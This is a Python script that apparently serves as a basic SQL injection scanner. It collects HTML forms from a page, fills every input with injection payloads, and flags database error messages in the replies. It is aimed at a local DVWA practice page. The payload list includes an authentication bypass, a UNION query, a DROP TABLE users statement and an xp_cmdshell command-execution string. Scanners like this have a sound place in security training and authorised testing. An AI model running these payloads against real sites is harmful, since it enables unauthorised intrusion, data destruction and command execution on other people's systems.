import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

ERRORS = {
    "You have an error in your SQL syntax;": "MySQL Syntax Error",
    "Warning: mysql_fetch_array()": "MySQL Fetch Array Warning",
    "Unclosed quotation mark after the character string": "MSSQL Unclosed Quotation Mark",
    "Microsoft OLE DB Provider for SQL Server": "MSSQL OLE DB Provider Error",
    "pg_query()": "PostgreSQL Query Error",
    "supplied argument is not a valid PostgreSQL result": "PostgreSQL Invalid Result Error",
}

PAYLOADS = {
    "' OR '1'='1": "Basic SQL Injection Payload",
    "'; DROP TABLE users; --": "SQL Injection with Table Drop",
    "' UNION SELECT NULL, NULL, NULL --": "Union Based SQL Injection Payload",
    "' OR '1'='1' --": "Bypass Authentication Payload",
    "'; EXEC xp_cmdshell('dir'); --": "SQL Injection with Command Execution",
}
def find_forms(url, session):
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    return soup.find_all("form")

def form_details(form):
    details = {}
    details['action'] = form.attrs.get("action","").lower()
    details['method'] = form.attrs.get("method","get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type","text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value","")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details['inputs'] = inputs
    return details

def check_vulnerable(response):
    content = response.text.lower()
    for error in ERRORS:
        if error in content:
            return True
    return False

def test_injection(url, session):
    forms = find_forms(url, session)
    print(f"[+] Found {len(forms)} forms on {url}")
    for form in forms:
        form_detail = form_details(form)
        for payload in PAYLOADS:
            data = {}
            for input_field in form_detail["inputs"]:
                if input_field["type"] == "submit":
                    continue
                data[input_field["name"]] = payload
            target_url = urljoin(url, form_detail["action"])
            if form_detail["method"] == "post":
                resp = session.post(target_url, data=data)
            else:
                resp = session.get(target_url, params=data)
            if check_vulnerable(resp):
                print(f"VULNERABLE: {target_url} with payload: {payload}")
            else:
                print(f"No issue detected at {target_url} with payload {payload}")
                
                
if __name__ == "__main__":
    test_url = "http://localhost/DVWA/vulnerable_page.php"
    s = requests.Session()
    test_injection(test_url,s)